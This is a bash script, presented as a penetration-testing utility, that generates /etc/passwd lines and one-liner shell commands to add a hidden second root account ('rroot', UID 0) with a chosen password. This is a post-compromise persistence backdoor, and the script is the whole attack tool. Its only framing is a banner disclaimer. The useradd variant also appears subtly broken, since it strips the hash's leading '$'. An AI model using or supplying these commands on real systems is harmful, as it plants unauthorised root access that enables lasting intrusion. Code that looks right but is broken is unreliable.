#!/bin/bash
#
# add_rroot.sh - Create a root-level user (rroot) for penetration testing
#
# This script generates the necessary commands to add a root user with UID 0
# to a target system's /etc/passwd file.
#
# Usage: ./add_rroot.sh [password]
# If no password is provided, you'll be prompted to enter one.

# Set default username (can be customized)
USERNAME="rroot"
HOME_DIR="/root"
SHELL="/bin/sh"
UID_VALUE="0"
GID_VALUE="0"
GECOS="root"

# Display a banner with information
function show_banner() {
    echo "======================================================================"
    echo "  ADD ROOT USER UTILITY - FOR PENETRATION TESTING PURPOSES ONLY"
    echo "  Created user: $USERNAME with UID: $UID_VALUE"
    echo "======================================================================"
}

# Generate the password hash
function generate_password_hash() {
    local password="$1"
    local hash

    if [ -n "$password" ]; then
        # Use provided password
        hash=$(openssl passwd "$password")
    else
        # Prompt for password
        echo "Enter password for new root user '$USERNAME':"
        hash=$(openssl passwd)
    fi

    echo "$hash"
}

# Display the entry for direct editing of /etc/passwd
function show_direct_edit() {
    local hash="$1"
    echo "======================================================================"
    echo "DIRECT EDIT (/etc/passwd entry)"
    echo "----------------------------------------------------------------------"
    echo "$USERNAME:$hash:$UID_VALUE:$GID_VALUE:$GECOS:$HOME_DIR:$SHELL"
    echo "----------------------------------------------------------------------"
}

# Display one-liner commands to add the user non-interactively
function show_commands() {
    local hash="$1"
    local escaped_hash

    # Escape $ characters for shell use
    escaped_hash=${hash//\$/\\$}

    echo "NON-INTERACTIVE COMMANDS"
    echo "----------------------------------------------------------------------"
    echo "# Basic append to /etc/passwd:"
    echo "echo \"$USERNAME:$escaped_hash:$UID_VALUE:$GID_VALUE:$GECOS:$HOME_DIR:$SHELL\" >> /etc/passwd"
    echo ""
    echo "# Safe append (checks if user already exists):"
    echo "grep -q \"^$USERNAME:\" /etc/passwd || echo \"$USERNAME:$escaped_hash:$UID_VALUE:$GID_VALUE:$GECOS:$HOME_DIR:$SHELL\" >> /etc/passwd"
    echo "----------------------------------------------------------------------"
}

# Display additional methods for adding the user
function show_additional_methods() {
    local hash="$1"

    echo "ADDITIONAL METHODS"
    echo "----------------------------------------------------------------------"
    echo "# Using useradd (if available):"
    echo "useradd -o -u $UID_VALUE -g $GID_VALUE -M -d $HOME_DIR -s $SHELL $USERNAME && echo \"$USERNAME:$(echo "$hash" | cut -d '$' -f 2-)\" | chpasswd -e"
    echo "----------------------------------------------------------------------"
}

# Main execution
# If a password was provided as an argument, use it; otherwise prompt
PASS_HASH=$(generate_password_hash "$1")

# Display results
show_banner
show_direct_edit "$PASS_HASH"
show_commands "$PASS_HASH"
show_additional_methods "$PASS_HASH"

echo "======================================================================"
echo "NOTE: This script is for penetration testing purposes only."
echo "      Unauthorized use against systems without permission is illegal."
echo "======================================================================"
